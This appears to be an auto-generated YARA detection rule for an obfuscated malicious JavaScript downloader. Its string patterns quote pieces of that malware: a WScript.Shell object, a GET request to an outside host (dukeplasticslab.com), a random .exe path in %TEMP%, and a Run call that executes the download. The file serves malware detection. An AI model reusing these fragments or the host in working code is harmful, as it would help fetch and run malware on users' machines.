rule sig_20160328_2faa28c477a66cecb9e74c23329a5981 {
  meta:
    description = "datamaliciousorder - file 20160328_2faa28c477a66cecb9e74c23329a5981.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "5033534844625b31220a14fad1a94e40be5a77a7756c0e1eb4faea76e0f326a6"

  strings:
    $s1  = "function Cxgwpdcxz() {return Zxxhsggbr[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"1eRyvPC5GxpVfQB.exe\";};" fullword ascii
    $s2  = "Hsqyod[Hkziqpx](\"GET\", \"http://dukeplasticslab.com/j47akfa\", false);" fullword ascii
    $s3  = "do {WScript[Vtekumgxn](Jsmbdy() * 11)} while (Hsqyod[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Wmqxtmef(Tmwqe, Xyfcdwim){return Tmwqe - Xyfcdwim;};" fullword ascii
    $s5  = "var Zxxhsggbr = function Esmblxkp() {return WScript[Irwagc](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Ktwnutfg() {return ((Vjmfhytati == true) && (Vjmfhytati == Jpsnh)) ? 1 : Pajbhtn;};" fullword ascii
    $s7  = "function Okcngrddax(Ewdpn){Zxxhsggbr[\"Run\"](Ewdpn, Pajbhtn, Pajbhtn);};" fullword ascii
    $s8  = "Vjmfhytati = true; " fullword ascii
    $s9  = "var Hbtbsfqll = new this[\"Date\"]();" fullword ascii
    $s10 = "var Bopezvnth = false;" fullword ascii
    $s11 = " while (Fhxylcp){" fullword ascii
    $s12 = "return Wmqxtmef(Homvc, Zdiqyp);" fullword ascii
    $s13 = "Jpsnh = true; " fullword ascii
    $s14 = "function Npzqqqbcuv(){return Irwagc;};" fullword ascii
    $s15 = "function Pbbnlhzpj(Xppwx) {var Uswasz = (1, 2, 3, 4, 5, Xppwx); return Uswasz;};" fullword ascii
    $s16 = "var Vjmfhytati = false;" fullword ascii
    $s17 = "var Jpsnh = false;" fullword ascii
    $s18 = "function Jsmbdy(){return 22;};" fullword ascii
    $s19 = "function Ivqpvopcuo()" fullword ascii
    $s20 = "function Jvzdkn(){return Iolobjxmx;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}